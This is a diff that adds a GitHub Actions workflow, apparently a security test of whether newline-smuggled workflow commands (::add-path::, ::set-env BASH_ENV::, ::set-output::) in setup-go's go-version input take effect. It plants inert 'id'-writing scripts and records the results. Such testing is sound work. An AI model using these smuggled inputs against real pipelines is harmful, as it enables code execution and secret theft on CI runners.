@@ -1,0 +1,84 @@
+name: setup-go critical command escalation
+on:
+  workflow_dispatch:
+permissions:
+  contents: read
+jobs:
+  boundary:
+    runs-on: ubuntu-latest
+    timeout-minutes: 5
+    steps:
+      - name: Prepare inert command targets
+        shell: bash
+        run: |
+          mkdir -p /tmp/setupgo-command-bin
+          cat > /tmp/setupgo-command-bin/go <<'SH'
+          #!/usr/bin/env bash
+          id > /tmp/setupgo-addpath-id
+          echo 'go version go1.23.4 linux/amd64'
+          SH
+          chmod 700 /tmp/setupgo-command-bin/go
+          cat > /tmp/setupgo-bash-env <<'SH'
+          id > /tmp/setupgo-setenv-id
+          SH
+          chmod 600 /tmp/setupgo-bash-env
+      - name: Same-line negative
+        id: same_line
+        continue-on-error: true
+        uses: actions/setup-go@b7ad1dad31e06c5925ef5d2fc7ad053ef454303e
+        with:
+          go-version: 'x::add-path::/tmp/setupgo-command-bin'
+          check-latest: false
+          cache: false
+          token: ''
+      - name: Newline command attempt
+        id: injected
+        continue-on-error: true
+        uses: actions/setup-go@b7ad1dad31e06c5925ef5d2fc7ad053ef454303e
+        with:
+          go-version: |-
+            x
+            ::add-path::/tmp/setupgo-command-bin
+            ::set-env name=BASH_ENV::/tmp/setupgo-bash-env
+            ::set-output name=control::SETUPGO_CRITICAL_9136c5e05a9b9ab574042c1b7729ecec
+          check-latest: false
+          cache: false
+          token: ''
+      - name: Exercise possible path effect
+        if: always()
+        shell: bash
+        run: |
+          go version >/dev/null 2>&1 || true
+      - name: Preserve sanitized result
+        if: always()
+        shell: bash
+        env:
+          CONTROL: ${{ steps.injected.outputs.control }}
+          EXPECTED: 'SETUPGO_CRITICAL_9136c5e05a9b9ab574042c1b7729ecec'
+        run: |
+          python3 - <<'PY'
+          import hashlib,json,os,pathlib
+          def row(path):
+              p=pathlib.Path(path)
+              raw=p.read_bytes() if p.exists() else b''
+              return {'present':p.exists(),'bytes':len(raw),'sha256':hashlib.sha256(raw).hexdigest()}
+          result={
+              'schema':'setup-go-critical-command-escalation-run/v1',
+              'set_output_positive_control':os.environ.get('CONTROL','')==os.environ['EXPECTED'],
+              'add_path_id_effect':row('/tmp/setupgo-addpath-id'),
+              'set_env_id_effect':row('/tmp/setupgo-setenv-id'),
+              'bash_env_present':os.environ.get('BASH_ENV','')=='/tmp/setupgo-bash-env',
+              'path_prepend_present':os.environ.get('PATH','').split(':')[0]=='/tmp/setupgo-command-bin',
+          }
+          pathlib.Path('/tmp/setupgo-critical-result.json').write_text(json.dumps(result,sort_keys=True))
+          print('SETUPGO_CONTROL='+str(result['set_output_positive_control']).lower())
+          print('SETUPGO_ADDPATH_EFFECT='+str(result['add_path_id_effect']['present']).lower())
+          print('SETUPGO_SETENV_EFFECT='+str(result['set_env_id_effect']['present']).lower())
+          PY
+      - name: Upload result
+        if: always()
+        uses: actions/upload-artifact@cf430e030ddbb5b0abf93d22962f4752f3646cd9
+        with:
+          name: setup-go-critical-result
+          path: /tmp/setupgo-critical-result.json
+          if-no-files-found: error
